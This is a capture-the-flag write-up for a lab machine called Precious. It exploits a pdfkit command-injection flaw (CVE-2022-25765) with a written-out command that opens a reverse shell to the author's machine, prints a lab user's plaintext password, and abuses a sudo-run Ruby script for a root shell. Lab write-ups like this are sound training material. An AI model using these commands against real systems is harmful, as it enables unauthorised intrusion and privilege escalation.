Precious

Target IP: 10.129.228.98
Challenge Description: N/A.

Reconnaissance


Performing a port scan shows there are SSH and HTTP applications open on the target machine.


Doing an aggressive port scan against the open TCP ports returns the result above. I will start enumeration with the HTTP application on port 80.

Enumeration

Port 80: HTTP

The webpage above is displayed for this web application. This web application converts a webpage to pdf. The source-code of this webpage does not reveal anything useful except the parameter url.


I tried to use the application to generate a PDF document, but I had no luck. Running a directory search against this web application did not provide anything useful. However, using curl, I obtained the underlying technology used by this web application. It seems to be created using Ruby. And the web server is running Phusion Passenger(R) 6.0.15.


Since the web application converts a webpage to PDF. There must be some sort of library being used by the target. I checked the different libraries for this HTML to PDF conversion and found the libraries above.


It looks like the host is running pdfkit and this is vulnerable to Command Injection. This vulnerability has the CVE of CVE-2022-25765.

Exploitation


After doing some search for CVE-2022-25765 exploits, I came across the Github repository exploit above. If the target machine is running pdfkit then this exploit will be perfect.


I made a copy of the exploit using the command searchsploit -m 51293 on my machine. Now I have a copy of the exploit.


I started a listener on my machine at port 8443. I used the command python3 51293.py -s 10.10.16.13 8443 -w http://precious.htb -p url to launch the exploit. Then I obtained a reverse shell connection on my machine at port 8443 from the target machine as the user ruby, as shown above. Now I have a foothold on the target machine.

Privilege Escalation


There is a hidden directory called .bundle located at the directory of user ruby. This directory contains a file called config which contains the credentials henry:Q3c1AqGHtoI0aXAYFH. Using su, I successfully managed to switch to the user henry usnig the password Q3c1AqGHtoI0aXAYFH as shown above. I successfully elevated my privileges horizontally from the user ruby to henry.


Running sudo -l shows the interesting command, in the picture above, that can be used as the user root without password. I cannot modify the ruby script. The weakness is not the use of absolute pathing. Meaning the program will load dependencies.yml in the directory.


Reading the content of update_dependencies.rb shows it reads the dependencies.yml file. I cannot modify this file either.


On my machine, I created the code above for the privilege escalation. This will invoke a reverse shell connection to my machine at port 8444. Then I transferred this to the target machine.


I started a listener on my machine at port 8444. Then I used the command sudo /usr/bin/ruby /opt/update_dependencies.rb. And I obtained a reverse shell connection with the session as the user root. Now I have a root shell on the target machine.
